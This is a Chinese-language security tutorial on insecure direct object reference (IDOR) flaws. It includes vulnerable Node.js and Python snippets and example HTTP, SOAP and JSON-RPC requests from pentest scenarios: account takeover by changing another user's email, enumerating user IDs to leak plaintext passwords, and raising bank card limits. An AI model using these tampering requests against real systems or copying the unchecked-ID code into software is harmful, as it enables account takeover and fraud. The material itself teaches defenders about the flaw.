# 不安全的直接对象引用（IDOR）

https://cwe.mitre.org/data/definitions/639.html

不安全的直接对象引用（IDOR）是一种访问控制漏洞，它在更细粒度层面运作。当服务器上的对象可以通过用户提供的参数（如 URL 查询参数、HTTP POST 请求体或 URL 中的 `:id` 字段）直接访问时，即发生直接对象引用。

当 Web 应用程序未能正确验证这些输入参数，允许攻击者调整它们并访问未授权对象时，这种引用就变得不安全（因此称为“不安全的直接对象引用”）。

IDOR 漏洞经常在缺乏集中授权检查的应用程序中发现。在具有多个角色且每个角色拥有一组复杂权限和功能访问权限的复杂环境中，此问题更加严重。

IDOR 漏洞最常与水平权限提升相关联，但它们也可能与垂直权限提升有关。

## IDOR 示例

有许多访问控制漏洞的示例，其中用户可控的参数值被用来直接访问资源或功能。

### 直接引用静态文件的 IDOR 漏洞

当敏感资源位于服务器端文件系统的静态文件中时，IDOR 漏洞常常出现。例如，一个网站可能使用递增文件名将聊天消息记录保存到磁盘，并允许用户通过访问如下 URL 来检索这些记录：

```
https://insecure-website.com/static/12144.txt
```

在这种情况下，攻击者可以简单地修改文件名以检索由其他用户创建的记录，并可能获取用户凭据和其他敏感数据。

#### 额外示例

考虑以下 HTTP 端点：

```javascript
app.get('/files/:id', function(req, res, next) => {
  return res.sendFile(`/filesystem/files/${req.params.id}`);
});
```

此端点根据由 `:id` 表示的文件名返回 `/filesystem/files` 下的任何文件。在客户端，开发者可能期望最终用户能够访问一个特定的文件。例如，开发者可能希望最终用户能够下载一个名为 `my-report-card.txt` 的文件。

为了请求文件 `my-report-card.txt`，最终用户的浏览器会发起以下请求：

```http
https://mywebsite.com/files/my-report-card.txt
```

攻击此 IDOR 很简单：只需在浏览器中拦截 HTTP GET 请求并更改文件名。或者使用像 Burp Suite 或 ZAP 这样的 HTTP 代理工具，在请求到达服务器之前拦截并修改它。

如果文件名被更改为 `other-report-card.txt`，即使当前用户不应该能够访问它，服务器也会尝试返回此文件。因此，IDOR 不仅是一种通过对象引用攻击对象的方法，也是一种权限提升的形式。

### 直接引用数据库对象的 IDOR 漏洞

考虑一个网站使用以下 URL 访问客户账户页面，通过从后端数据库检索信息：

```
https://insecure-website.com/customer_account?customer_number=132355
```

这里，客户编号在后端执行的查询中被直接用作记录索引。如果没有实施其他控制措施，攻击者可以简单地修改 `customer_number` 值，绕过访问控制以查看其他客户的记录。这是 IDOR 漏洞导致水平权限提升的一个示例。

攻击者可能通过将用户修改为具有额外权限的用户来执行水平和垂直权限提升，同时绕过访问控制。其他可能性包括利用密码泄露，或者一旦攻击者进入用户账户页面后修改参数等。

#### 额外示例

假设 example.com 是一个允许你与他人聊天的社交媒体站点。注册后，你发现你的用户 ID 是 1234。该网站允许你通过点击首页上的 “查看你的消息” 按钮来查看与好友的所有消息。点击该按钮后，你会被重定向到以下位置，显示你的所有私信：`https://example.com/messages?user_id=1234`。

现在，如果你将 URL 栏中的地址改为 `https://example.com/messages?user_id=1233` 呢？

你会发现现在可以看到另一名用户（用户 1233）与其好友之间的所有私信。此时，你就发现了一个 IDOR 漏洞。应用程序未基于用户身份限制对消息的访问，而是允许用户请求他们想要的任何消息。应用程序天真地信任用户输入，直接根据用户提供的 `user_id` 值加载资源，如下示例代码所示：

```py
messages = load_messages(request.user_id)
display_messages(messages)
```

IDOR 不仅限于读取其他用户的信息。你还可以利用它们以其他用户的名义编辑数据。例如，假设用户可以提交 POST 请求来更改密码。POST 请求必须包含该用户的 ID 和新密码，并定向到 `/change_password` 端点：

```http
POST /change_password

user_id=1234&new_password=12345
```

在这种情况下，如果应用程序不验证提交的用户 ID 是否对应当前登录用户，攻击者可能通过发送不属于自己的用户 ID 来更改其他人的密码，如下所示：

```http
POST /change_password

user_id=1233&new_password=12345
```

## 场景示例

### 通过更改电子邮件实现账户接管

在一次渗透测试中，发现了一个名为 `save.json` 的端点，允许用户更改其电子邮件地址。进一步分析发现，只需将 `email` 参数更改为另一用户的电子邮件，系统就会更新现有用户的电子邮件，从而授予相同权限。此漏洞导致潜在的账户接管。

**请求**
```http
POST /rest/users/save.json HTTP/1.1
Host: [redacted]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 2371
Connection: close
Cookie: JsESSIONID=LHYTDrY88Vv ...

{
    "user": {
        "userId": "[redacted].test",
        "firstName": "Couselink",
        "lastName": "Test",
        "position": "[redacted]",
        "phone": "[redacted]",
        "mobile": "[redacted]",
        "email": "attacker@gmail.com",
        "principalName": "",
        "principalEmail": "",
        "selectMenu": "3"
    }
}
```

执行此请求后，响应返回被入侵用户的用户 ID、密码哈希和电子邮件。

### IDOR 导致敏感信息泄露和权限提升

在对基于 JSP 的 Web 应用程序进行渗透测试期间，我们在 `User.jsp` 端点中发现了一个漏洞。该端点允许用户更新“用户名”、“密码”和“电子邮件地址”等详细信息。它使用 `user` 参数接受用户 ID（例如 `261132`）作为输入。通过简单地递增此用户 ID，应用程序显示了其他用户的详细信息，包括明文用户名和密码。此问题既构成信息泄露风险，也可能导致账户接管，尤其是当使用上述用户 ID 作为示例时。

**请求**
```
https://target.com/ptrade/jsp/User.jsp?jSessionID=164820892&form_action=edit&user=261132
```

### SOAP 账户接管漏洞

让我们看一个导致账户接管的不安全直接对象引用（IDOR）的真实示例。在一次渗透测试中，观察到应用程序使用 SOAP 消息交换信息。

其中一个端点有一个名为“userIdentifier”的参数，旨在作为系统中单个用户的唯一引用。然而，观察到通过更改 SOAP 请求中的“userIdentifier”号码，可以查看其他用户的详细信息，如名字、姓氏、登录名，甚至他们的明文密码。因此，通过递增 ID，可以检索所有用户的密码，导致大量账户接管。以下是请求的样子：

**请求**
```
POST /AuthorisationWebService.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) SOAPAction: www.example.com/service/AuthorisationWebService/GetUser
Content-Length: 1320
Origin: https://example.com
Cookie: [redacted]

<soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='www.w3.org/2001/XMLSchema-instance' xmlns:xsd='www.w3.org/2001/XMLSchema'>
    <soap:Header></soap:Header>
    <soap:Body xmlns:ns0='www.example.com/service/AuthorisationWebService'>
        <ns0:GetUser>
            <ns0:request>
                <AuthorisationServiceRequest>
                    <MessageHeader>
                        <SecurityToken>
                            <SessionId>[redacted]</SessionId>
                            <ApplicationId></ApplicationId>
                        </SecurityToken>
                    </MessageHeader>
                    <MessageBody>
                        <RequestList>
                            <RequestItem>
                                <DataList>
                                    <DataItem>
                                        <User>
                                            <UserIdentifier>88</UserIdentifier>
                                            <UserLogin>userA</UserLogin>
                                            <UserFirstName>userB</UserFirstName>
                                            <UserLastName>userB</UserLastName>
                                        </User>
                                    </DataItem>
                                </DataList>
                            </RequestItem>
                        </RequestList>
                    </MessageBody>
                </AuthorisationServiceRequest>
            </ns0:request>
        </ns0:GetUser>
    </soap:Body>
</soap:Envelope>
```

响应显示了诸如名字、姓氏甚至密码等详细信息

### JSON-RPC 信用卡限额修改

让我们看一个来自涉及银行应用程序的渗透测试的真实 IDOR 示例。该应用程序容易受到 IDOR 攻击，允许用户修改“信用卡”限额，使其超过应用程序定义和界面限制的最大阈值。

由于信用卡限额基于用户的个人资料和信用历史，并且欺诈检测系统使用异常交易作为识别潜在欺诈活动的手段，如果用户能够在不经过风险评估的情况下修改其限额，这将有效绕过这些控制。同样，如果攻击者获得了多个账户，他们可能会大规模利用此漏洞。

在以下请求中，调用了方法`tmgmBanking.card.setlimits`，并修改了与`TransactionMaxLimit*`关联的参数以实现此效果。

**请求**
```http
POST /rpc/tmgmBanking.card.setlimits HTTP/1.1
Host: redacted
Accept: */*
Content-Type: application/json
Authorization: 
Cookie: [omitted]
Content-Length: 411
User-Agent: redacted
Accept-Language: en
Accept-Encoding: gzip, deflate
Connection: close

{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tmgmBanking.card.setlimits",
    "params": {
        "transactionMaxLimit": "50000000000000",
        "transactionMaxLimitDaily": 50000000000000,
        "transactionMaxLimitWeekly": 50000000000000,
        "transactionMaxLimitMonthly": 50000000000000,
        "contactlessEnabled": true,
        "onlineEnabled": true,
        "atmEnabled": true
    }
}
```
